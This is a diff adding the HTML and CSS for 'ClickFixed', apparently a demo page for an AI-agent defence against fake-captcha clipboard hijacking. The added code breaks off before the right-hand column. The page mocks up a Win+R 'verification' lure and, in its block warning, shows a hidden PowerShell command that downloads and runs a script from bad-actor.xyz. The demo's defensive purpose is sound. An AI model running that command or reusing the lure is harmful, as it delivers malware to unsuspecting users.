@@ -1,0 +1,1924 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ClickFixed — Interactive Multi-Agent Architecture Presentation</title>
+  <!-- Google Fonts: Inter & Outfit -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Outfit:wght@400;500;600;700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+  
+  <style>
+    /* --- CSS Variables & Design System --- */
+    :root {
+      --bg-dark: #0b0f19;
+      --bg-card: rgba(17, 24, 39, 0.7);
+      --bg-terminal: #05070c;
+      --border-glow: rgba(167, 139, 250, 0.15);
+      --border-glow-active: rgba(96, 165, 250, 0.4);
+      
+      --purple: #a78bfa;
+      --purple-glow: rgba(167, 139, 250, 0.4);
+      --blue: #60a5fa;
+      --blue-glow: rgba(96, 165, 250, 0.4);
+      --cyan: #34d399;
+      --cyan-glow: rgba(52, 211, 153, 0.4);
+      --red: #f87171;
+      --red-glow: rgba(248, 113, 113, 0.4);
+      
+      --text-main: #9ca3af;
+      --text-light: #f3f4f6;
+      --text-muted: #4b5563;
+      
+      --font-outfit: 'Outfit', sans-serif;
+      --font-inter: 'Inter', sans-serif;
+      --font-mono: 'Fira Code', monospace;
+      
+      --transition-smooth: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    /* --- Reset & Global --- */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg-dark);
+      color: var(--text-main);
+      font-family: var(--font-inter);
+      overflow-x: hidden;
+      line-height: 1.5;
+      background-image: 
+        radial-gradient(circle at 10% 20%, rgba(139, 92, 246, 0.05) 0%, transparent 40%),
+        radial-gradient(circle at 80% 80%, rgba(59, 130, 246, 0.05) 0%, transparent 40%);
+    }
+
+    h1, h2, h3, h4, .outfit-font {
+      font-family: var(--font-outfit);
+      color: var(--text-light);
+    }
+
+    /* --- Container & Layout --- */
+    .container {
+      max-width: 1400px;
+      margin: 0 auto;
+      padding: 2rem;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 2rem;
+      padding-bottom: 1.5rem;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+
+    .logo-glow {
+      position: relative;
+      width: 40px;
+      height: 40px;
+      background: linear-gradient(135deg, var(--purple), var(--blue));
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 800;
+      color: white;
+      box-shadow: 0 0 15px rgba(167, 139, 250, 0.4);
+    }
+
+    .brand-title h1 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      letter-spacing: -0.025em;
+      background: linear-gradient(to right, #f3f4f6, #9ca3af);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .brand-title p {
+      font-size: 0.75rem;
+      color: var(--purple);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      font-weight: 600;
+    }
+
+    .status-badges {
+      display: flex;
+      gap: 1rem;
+    }
+
+    .badge {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 20px;
+      padding: 0.35rem 0.75rem;
+      font-size: 0.75rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      color: var(--text-light);
+    }
+
+    .badge .indicator {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background-color: var(--cyan);
+      box-shadow: 0 0 8px var(--cyan);
+    }
+
+    .badge .indicator.pulse {
+      animation: indicator-pulse 2s infinite;
+    }
+
+    @keyframes indicator-pulse {
+      0% { box-shadow: 0 0 0 0 rgba(52, 211, 153, 0.7); }
+      70% { box-shadow: 0 0 0 6px rgba(52, 211, 153, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(52, 211, 153, 0); }
+    }
+
+    /* --- Interactive Simulator Grid --- */
+    .dashboard-grid {
+      display: grid;
+      grid-template-columns: 1.1fr 1.3fr;
+      gap: 2rem;
+      margin-bottom: 2rem;
+    }
+
+    @media (max-width: 1024px) {
+      .dashboard-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    /* --- Glassmorphic Panels --- */
+    .panel {
+      background: var(--bg-card);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border: 1px solid var(--border-glow);
+      border-radius: 16px;
+      padding: 1.5rem;
+      position: relative;
+      overflow: hidden;
+      transition: var(--transition-smooth);
+    }
+
+    .panel:hover {
+      border-color: rgba(167, 139, 250, 0.25);
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+    }
+
+    .panel-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1.25rem;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      padding-bottom: 0.75rem;
+    }
+
+    .panel-header h2 {
+      font-size: 1.15rem;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    /* --- Simulated Chrome Window --- */
+    .chrome-window {
+      background: #111827;
+      border: 1px solid rgba(255, 255, 255, 0.07);
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+      display: flex;
+      flex-direction: column;
+      height: 350px;
+      position: relative;
+    }
+
+    .chrome-header {
+      background: #1f2937;
+      padding: 0.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    }
+
+    .chrome-dots {
+      display: flex;
+      gap: 4px;
+    }
+
+    .chrome-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+    .dot-red { background-color: #ef4444; }
+    .dot-yellow { background-color: #f59e0b; }
+    .dot-green { background-color: #10b981; }
+
+    .chrome-url-bar {
+      background: #0f172a;
+      flex-grow: 1;
+      border-radius: 6px;
+      padding: 0.2rem 0.75rem;
+      font-size: 0.75rem;
+      color: #9ca3af;
+      font-family: var(--font-mono);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .chrome-body {
+      flex-grow: 1;
+      padding: 1.5rem;
+      background: #1e293b;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+    }
+
+    /* --- Captcha Lure Overlay --- */
+    .lure-container {
+      background: rgba(15, 23, 42, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 12px;
+      padding: 1.5rem;
+      max-width: 320px;
+      text-align: center;
+      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5);
+      z-index: 10;
+      transition: var(--transition-smooth);
+    }
+
+    .lure-logo {
+      width: 48px;
+      height: 48px;
+      margin-bottom: 0.75rem;
+    }
+
+    .lure-title {
+      font-size: 0.95rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+      color: #fff;
+    }
+
+    .lure-text {
+      font-size: 0.75rem;
+      color: #9ca3af;
+      margin-bottom: 1rem;
+      line-height: 1.4;
+    }
+
+    .lure-steps {
+      background: #0b0f19;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 8px;
+      padding: 0.75rem;
+      font-size: 0.7rem;
+      text-align: left;
+      margin-bottom: 1rem;
+    }
+
+    .lure-steps ol {
+      padding-left: 1rem;
+    }
+
+    .lure-steps li {
+      margin-bottom: 0.35rem;
+      color: #d1d5db;
+    }
+
+    .btn-copy-code {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      width: 100%;
+      background: linear-gradient(90deg, #3b82f6, #2563eb);
+      color: white;
+      border: none;
+      border-radius: 6px;
+      padding: 0.5rem;
+      font-size: 0.75rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: var(--transition-smooth);
+    }
+
+    .btn-copy-code:hover {
+      opacity: 0.9;
+      box-shadow: 0 0 10px rgba(59, 130, 246, 0.5);
+    }
+
+    /* --- Shadow DOM Warning Overlay (Closed mode style) --- */
+    .shadow-warning-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(15, 23, 42, 0.85);
+      backdrop-filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 20;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.4s ease;
+    }
+
+    .shadow-warning-overlay.show {
+      opacity: 1;
+      pointer-events: all;
+    }
+
+    .warning-panel {
+      background: #0f172a;
+      border: 2px solid var(--red);
+      border-radius: 12px;
+      padding: 1.5rem;
+      max-width: 380px;
+      text-align: center;
+      box-shadow: 0 10px 40px var(--red-glow);
+      transform: scale(0.9);
+      transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+
+    .shadow-warning-overlay.show .warning-panel {
+      transform: scale(1);
+    }
+
+    .warning-header {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.5rem;
+      margin-bottom: 1rem;
+    }
+
+    .warning-icon {
+      width: 48px;
+      height: 48px;
+      background: rgba(239, 68, 68, 0.1);
+      border: 2px solid var(--red);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--red);
+      font-size: 1.5rem;
+      font-weight: 700;
+      animation: alert-pulse 1.5s infinite;
+    }
+
+    @keyframes alert-pulse {
+      0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
+      70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(239, 68, 68, 0); }
+      100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
+    }
+
+    .warning-title {
+      color: var(--red);
+      font-size: 1.1rem;
+      font-weight: 700;
+      font-family: var(--font-outfit);
+    }
+
+    .warning-body {
+      font-size: 0.8rem;
+      color: #9ca3af;
+      margin-bottom: 1.25rem;
+      line-height: 1.4;
+    }
+
+    .warning-details {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 6px;
+      padding: 0.5rem;
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      color: #cbd5e1;
+      word-break: break-all;
+      margin-bottom: 1.25rem;
+    }
+
+    .warning-buttons {
+      display: flex;
+      gap: 0.75rem;
+    }
+
+    .warning-btn {
+      flex: 1;
+      padding: 0.5rem;
+      border-radius: 6px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: var(--transition-smooth);
+    }
+
+    .btn-red {
+      background: var(--red);
+      color: white;
+      border: none;
+    }
+
+    .btn-red:hover {
+      background: #ef4444;
+      box-shadow: 0 0 10px rgba(239, 68, 68, 0.4);
+    }
+
+    .btn-outline {
+      background: transparent;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      color: #fff;
+    }
+
+    .btn-outline:hover {
+      background: rgba(255, 255, 255, 0.05);
+      border-color: rgba(255, 255, 255, 0.4);
+    }
+
+    /* --- Simulator Controls --- */
+    .controls-panel {
+      margin-top: 1rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+    }
+
+    .scenario-selector {
+      display: flex;
+      gap: 0.5rem;
+    }
+
+    .tab-btn {
+      flex: 1;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      padding: 0.5rem;
+      font-size: 0.75rem;
+      color: #9ca3af;
+      border-radius: 8px;
+      cursor: pointer;
+      font-family: var(--font-outfit);
+      font-weight: 500;
+      transition: var(--transition-smooth);
+    }
+
+    .tab-btn.active {
+      background: linear-gradient(135deg, rgba(167, 139, 250, 0.15), rgba(96, 165, 250, 0.15));
+      border-color: var(--purple);
+      color: var(--text-light);
+    }
+
+    .playback-controls {
+      display: flex;
+      gap: 0.5rem;
+    }
+
+    .play-btn {
+      flex-grow: 2;
+      background: linear-gradient(135deg, var(--purple), var(--blue));
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 0.65rem;
+      font-family: var(--font-outfit);
+      font-size: 0.85rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      box-shadow: 0 4px 12px rgba(167, 139, 250, 0.25);
+      transition: var(--transition-smooth);
+    }
+
+    .play-btn:hover {
+      box-shadow: 0 4px 20px rgba(167, 139, 250, 0.4);
+      transform: translateY(-1px);
+    }
+
+    .control-btn-icon {
+      width: 14px;
+      height: 14px;
+    }
+
+    .secondary-btn {
+      flex-grow: 1;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      color: var(--text-light);
+      border-radius: 8px;
+      padding: 0.65rem;
+      font-family: var(--font-outfit);
+      font-size: 0.8rem;
+      font-weight: 500;
+      cursor: pointer;
+      transition: var(--transition-smooth);
+    }
+
+    .secondary-btn:hover {
+      background: rgba(255, 255, 255, 0.08);
+    }
+
+    /* --- Flow Stepper --- */
+    .stepper {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 1rem;
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 8px;
+      padding: 0.5rem;
+      position: relative;
+    }
+
+    .step-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex: 1;
+      position: relative;
+      z-index: 2;
+    }
+
+    .step-dot {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: #1f2937;
+      border: 2px solid #374151;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.6rem;
+      font-weight: 700;
+      color: #6b7280;
+      transition: var(--transition-smooth);
+    }
+
+    .step-label {
+      font-size: 0.6rem;
+      margin-top: 0.25rem;
+      color: #6b7280;
+      transition: var(--transition-smooth);
+      text-align: center;
+    }
+
+    .step-item.active .step-dot {
+      background: var(--blue);
+      border-color: var(--blue);
+      color: white;
+      box-shadow: 0 0 10px var(--blue-glow);
+    }
+
+    .step-item.active .step-label {
+      color: var(--text-light);
+      font-weight: 500;
+    }
+
+    .step-item.completed .step-dot {
+      background: var(--cyan);
+      border-color: var(--cyan);
+      color: white;
+    }
+
+    .step-item.completed .step-label {
+      color: var(--cyan);
+    }
+
+    /* --- Node Graph Visualization --- */
+    .graph-panel {
+      display: flex;
+      flex-direction: column;
+      height: 100%;
+    }
+
+    .graph-container {
+      flex-grow: 1;
+      position: relative;
+      min-height: 480px;
+      background: rgba(0, 0, 0, 0.25);
+      border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.03);
+      overflow: hidden;
+    }
+
+    .svg-flow-network {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+      pointer-events: none;
+    }
+
+    /* SVG Link paths and animations */
+    .flow-link {
+      fill: none;
+      stroke: rgba(255, 255, 255, 0.08);
+      stroke-width: 2.5;
+      transition: stroke 0.4s ease, stroke-width 0.4s ease;
+    }
+
+    .flow-link.active {
+      stroke: var(--blue);
+      stroke-width: 3.5;
+      animation: pulse-stroke 2s infinite;
+    }
+
+    .flow-link.success {
+      stroke: var(--cyan);
+      stroke-width: 3.5;
+    }
+
+    .flow-particles {
+      fill: none;
+      stroke: var(--purple);
+      stroke-width: 3.5;
+      stroke-dasharray: 8, 30;
+      stroke-linecap: round;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .flow-particles.active {
+      opacity: 1;
+      animation: flow-run 25s linear infinite;
+    }
+
+    .flow-particles.fast {
+      stroke: var(--cyan);
+      animation: flow-run 8s linear infinite;
+    }
+
+    @keyframes flow-run {
+      to {
+        stroke-dashoffset: -1000;
+      }
+    }
+
+    @keyframes pulse-stroke {
+      0% { stroke-opacity: 0.7; }
+      50% { stroke-opacity: 1; }
+      100% { stroke-opacity: 0.7; }
+    }
+
+    /* Node Cards positioning and styling */
+    .node-card {
+      position: absolute;
+      background: rgba(15, 23, 42, 0.9);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 8px;
+      padding: 0.6rem 0.85rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.2rem;
+      z-index: 5;
+      cursor: pointer;
+      width: 170px;
+      transition: var(--transition-smooth);
+    }
+
+    .node-card:hover {
+      border-color: var(--purple);
+      transform: scale(1.05);
+      box-shadow: 0 0 15px rgba(167, 139, 250, 0.2);
+    }
+
+    .node-card.active {
+      border-color: var(--blue);
+      box-shadow: 0 0 18px var(--blue-glow);
+      background: rgba(30, 41, 59, 0.95);
+    }
+
+    .node-card.success {
+      border-color: var(--cyan);
+      box-shadow: 0 0 18px var(--cyan-glow);
+      background: rgba(6, 78, 59, 0.6);
+    }
+
+    .node-card.running {
+      border-color: var(--purple);
+      box-shadow: 0 0 18px var(--purple-glow);
+      animation: card-pulse 1.5s ease-in-out infinite;
+    }
+
+    @keyframes card-pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.02); }
+      100% { transform: scale(1); }
+    }
+
+    .node-title-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .node-title {
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: #fff;
+    }
+
+    .node-subtitle {
+      font-size: 0.6rem;
+      color: #6b7280;
+    }
+
+    .node-card.active .node-subtitle,
+    .node-card.success .node-subtitle {
+      color: #9ca3af;
+    }
+
+    .node-label-pill {
+      font-size: 0.55rem;
+      padding: 0.1rem 0.35rem;
+      border-radius: 4px;
+      font-weight: 600;
+    }
+
+    .label-edge {
+      background: rgba(167, 139, 250, 0.15);
+      color: var(--purple);
+      border: 1px solid rgba(167, 139, 250, 0.3);
+    }
+
+    .label-cloud {
+      background: rgba(96, 165, 250, 0.15);
+      color: var(--blue);
+      border: 1px solid rgba(96, 165, 250, 0.3);
+    }
+
+    .label-mcp {
+      background: rgba(52, 211, 153, 0.15);
+      color: var(--cyan);
+      border: 1px solid rgba(52, 211, 153, 0.3);
+    }
+
+    /* Precise Coordinates mapping for nodes in graph panel */
+    #node-interceptor { top: 30px; left: 20px; }
+    #node-nano { top: 120px; left: 20px; }
+    #node-ingest { top: 75px; left: 220px; }
+    #node-auditor-sec { top: 20px; left: 420px; }
+    #node-auditor-priv { top: 110px; left: 420px; }
+    #node-analyst-mal { top: 200px; left: 420px; }
+    #node-synthesizer { top: 290px; left: 420px; }
+    #node-firestore { top: 230px; left: 220px; }
+    #node-webrisk { top: 400px; left: 420px; }
+    #node-abuselookup { top: 400px; left: 220px; }
+
+    /* Zone Subgraph Borders overlay */
+    .graph-zone {
+      position: absolute;
+      border-radius: 12px;
+      padding: 0.5rem;
+      font-family: var(--font-outfit);
+      font-size: 0.65rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .zone-edge {
+      top: 15px;
+      left: 10px;
+      width: 195px;
+      height: 180px;
+      border: 1.5px dashed rgba(167, 139, 250, 0.25);
+      background: rgba(139, 92, 246, 0.02);
+      color: var(--purple);
+    }
+
+    .zone-cloud {
+      top: 15px;
+      left: 212px;
+      width: 395px;
+      height: 365px;
+      border: 1.5px dashed rgba(96, 165, 250, 0.25);
+      background: rgba(59, 130, 246, 0.02);
+      color: var(--blue);
+      text-align: right;
+    }
+
+    /* --- Floating Node Popover --- */
+    .node-popover {
+      position: absolute;
+      bottom: 15px;
+      left: 15px;
+      right: 15px;
+      background: rgba(15, 23, 42, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      padding: 0.75rem;
+      z-index: 10;
+      font-size: 0.75rem;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+      transform: translateY(10px);
+      opacity: 0;
+      pointer-events: none;
+      transition: var(--transition-smooth);
+    }
+
+    .node-popover.show {
+      transform: translateY(0);
+      opacity: 1;
+    }
+
+    .popover-header {
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 0.25rem;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    /* --- Console / Terminal View --- */
+    .terminal-container {
+      background-color: var(--bg-terminal);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.6);
+    }
+
+    .terminal-header {
+      background: #0f1322;
+      padding: 0.6rem 1rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    }
+
+    .terminal-title {
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: #a78bfa;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .terminal-tabs {
+      display: flex;
+      gap: 0.5rem;
+    }
+
+    .term-tab {
+      background: transparent;
+      border: none;
+      color: #4b5563;
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      cursor: pointer;
+      padding: 0.2rem 0.5rem;
+      border-radius: 4px;
+      transition: var(--transition-smooth);
+    }
+
+    .term-tab.active {
+      color: #f3f4f6;
+      background: rgba(255, 255, 255, 0.05);
+    }
+
+    .terminal-body {
+      padding: 1rem;
+      height: 250px;
+      overflow-y: auto;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: #cbd5e1;
+      display: flex;
+      flex-direction: column;
+      gap: 0.35rem;
+      scroll-behavior: smooth;
+    }
+
+    .term-line {
+      display: flex;
+      gap: 0.5rem;
+    }
+
+    .term-prompt {
+      color: #8b5cf6;
+      user-select: none;
+    }
+
+    .term-timestamp {
+      color: #4b5563;
+      user-select: none;
+    }
+
+    .term-text-info { color: #60a5fa; }
+    .term-text-success { color: #34d399; }
+    .term-text-warning { color: #fbbf24; }
+    .term-text-danger { color: #f87171; }
+    .term-text-agent { color: #c084fc; font-weight: 500; }
+
+    /* --- Lab Subsystem --- */
+    .lab-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+    }
+
+    .lab-box {
+      background: rgba(0,0,0,0.3);
+      border: 1px solid rgba(255,255,255,0.05);
+      border-radius: 6px;
+      padding: 0.5rem;
+    }
+
+    .lab-title {
+      font-size: 0.7rem;
+      color: #9ca3af;
+      margin-bottom: 0.25rem;
+      border-bottom: 1px solid rgba(255,255,255,0.05);
+      padding-bottom: 0.2rem;
+    }
+
+    .lab-code {
+      font-family: var(--font-mono);
+      font-size: 0.65rem;
+      white-space: pre-wrap;
+      word-break: break-all;
+      color: #a78bfa;
+    }
+
+    /* --- Performance Metric Cards --- */
+    .metrics-section {
+      margin-top: 2rem;
+    }
+
+    .metrics-title {
+      font-size: 1.15rem;
+      font-weight: 600;
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .metrics-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 1.5rem;
+    }
+
+    @media (max-width: 768px) {
+      .metrics-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .metric-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border-glow);
+      border-radius: 12px;
+      padding: 1.25rem;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    .metric-card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.8rem;
+      color: var(--text-main);
+      margin-bottom: 0.75rem;
+    }
+
+    .metric-value-row {
+      display: flex;
+      align-items: baseline;
+      gap: 0.5rem;
+      margin-bottom: 0.75rem;
+    }
+
+    .metric-value {
+      font-size: 1.75rem;
+      font-weight: 700;
+      color: #fff;
+      font-family: var(--font-outfit);
+    }
+
+    .metric-unit {
+      font-size: 0.8rem;
+      color: var(--text-main);
+    }
+
+    .metric-bar-bg {
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 10px;
+      height: 6px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .metric-bar-fill {
+      height: 100%;
+      border-radius: 10px;
+      transition: width 1s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .fill-purple { background: linear-gradient(90deg, #8b5cf6, #c084fc); }
+    .fill-blue { background: linear-gradient(90deg, #3b82f6, #60a5fa); }
+    .fill-cyan { background: linear-gradient(90deg, #10b981, #34d399); }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    
+    <!-- Header with System Badges -->
+    <header>
+      <div class="brand">
+        <div class="logo-glow">CF</div>
+        <div class="brand-title">
+          <h1>ClickFixed</h1>
+          <p>Interactive Agent Presentation</p>
+        </div>
+      </div>
+      <div class="status-badges">
+        <div class="badge">
+          <div class="indicator pulse"></div>
+          <span>Browser Sensor: <b>Active</b></span>
+        </div>
+        <div class="badge">
+          <div class="indicator pulse" style="background-color: var(--purple); box-shadow: 0 0 8px var(--purple);"></div>
+          <span>Local Model: <b>Gemini Nano Ready</b></span>
+        </div>
+        <div class="badge">
+          <div class="indicator pulse" style="background-color: var(--blue); box-shadow: 0 0 8px var(--blue);"></div>
+          <span>Cloud Run ADK: <b>Connected</b></span>
+        </div>
+      </div>
+    </header>
+
+    <!-- Main Grid Dashboard -->
+    <div class="dashboard-grid">
+      
+      <!-- Left Column: Chrome Sandbox Simulator & Control Panel -->
+      <div style="display: flex; flex-direction: column; gap: 1.5rem;">
+        
+        <div class="panel">
+          <div class="panel-header">
+            <h2>🛡️ Client Sandbox</h2>
+            <span class="badge" style="font-size: 0.65rem; border-color: rgba(239, 68, 68, 0.2); background: rgba(239, 68, 68, 0.05); color: #f87171;">
+              Target: victim-portal.com
+            </span>
+          </div>
+
+          <!-- Chrome Browser Emulator -->
+          <div class="chrome-window">
+            <div class="chrome-header">
+              <div class="chrome-dots">
+                <div class="chrome-dot dot-red"></div>
+                <div class="chrome-dot dot-yellow"></div>
+                <div class="chrome-dot dot-green"></div>
+              </div>
+              <div class="chrome-url-bar">
+                <span>https://victim-portal.com/help-desk/login</span>
+                <span style="color: #4b5563;">🔒 HTTPS</span>
+              </div>
+            </div>
+            
+            <div class="chrome-body" id="chrome-body">
+              
+              <!-- Scenario 1 Display (Win+R Captcha Lure) -->
+              <div class="lure-container" id="captcha-lure">
+                <svg class="lure-logo" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2">
+                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+                <div class="lure-title">Security Captcha Verification</div>
+                <div class="lure-text">Verify you are human by running the automated diagnostics verification check.</div>
+                <div class="lure-steps">
+                  <ol>
+                    <li>Press <kbd style="background:#334155; padding:1px 3px; border-radius:3px;">Win + R</kbd> on your keyboard</li>
+                    <li>Copy the check script command below</li>
+                    <li>Paste into the Run prompt and press Enter</li>
+                  </ol>
+                </div>
+                <button class="btn-copy-code" id="btn-trigger-hijack">
+                  <svg style="width:14px; height:14px;" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"></path>
+                  </svg>
+                  Copy Verification Script
+                </button>
+              </div>
+
+              <!-- Shadow DOM Warning Panel (Hidden by default) -->
+              <div class="shadow-warning-overlay" id="warning-overlay">
+                <div class="warning-panel">
+                  <div class="warning-header">
+                    <div class="warning-icon">⚠️</div>
+                    <div class="warning-title">ClickFixed Proactive Block</div>
+                  </div>
+                  <div class="warning-body">
+                    Our AI agent detected and intercepted a malicious clipboard hijacking attempt. The fake captcha lure has been removed.
+                  </div>
+                  <div class="warning-details" id="warning-payload-view">
+                    powershell.exe -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://bad-actor.xyz/p.ps1')"
+                  </div>
+                  <div class="warning-buttons">
+                    <button class="warning-btn btn-red" onclick="closeWarning()">Close Shield</button>
+                    <button class="warning-btn btn-outline" onclick="window.termTabSelect('lab')">Deobfuscate Lab</button>
+                  </div>
+                </div>
+              </div>
+
+            </div>
+          </div>
+
+          <!-- Simulation Stepper -->
+          <div class="stepper">
+            <div class="step-item" id="step-0">
+              <div class="step-dot">1</div>
+              <div class="step-label">Intercept</div>
+            </div>
+            <div class="step-item" id="step-1">
+              <div class="step-dot">2</div>
+              <div class="step-label">Nano Edge AI</div>
+            </div>
+            <div class="step-item" id="step-2">
+              <div class="step-dot">3</div>
+              <div class="step-label">A2A Handoff</div>
+            </div>
+            <div class="step-item" id="step-3">
+              <div class="step-dot">4</div>
+              <div class="step-label">ADK Pipeline</div>
+            </div>
+            <div class="step-item" id="step-4">
+              <div class="step-dot">5</div>
+              <div class="step-label">Global Def</div>
+            </div>
+          </div>
+
+          <!-- Simulator Controls -->
+          <div class="controls-panel">
+            <div class="scenario-selector">
+              <button class="tab-btn active" id="tab-scen-1" onclick="selectScenario(1)">Scenario 1: Clipboard Hijack</button>
+              <button class="tab-btn" id="tab-scen-2" onclick="selectScenario(2)">Scenario 2: Captcha DOM Lure</button>
+            </div>
+            <div class="playback-controls">
+              <button class="play-btn" id="btn-play" onclick="startWalkthrough()">
+                <svg class="control-btn-icon" fill="currentColor" viewBox="0 0 24 24">
+                  <path d="M8 5v14l11-7z"></path>
+                </svg>
+                <span>Trigger & Simulate Workflow</span>
+              </button>
+              <button class="secondary-btn" id="btn-reset" onclick="resetSimulator()">Reset</button>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Right Column: Interactive Google ADK Graph -->
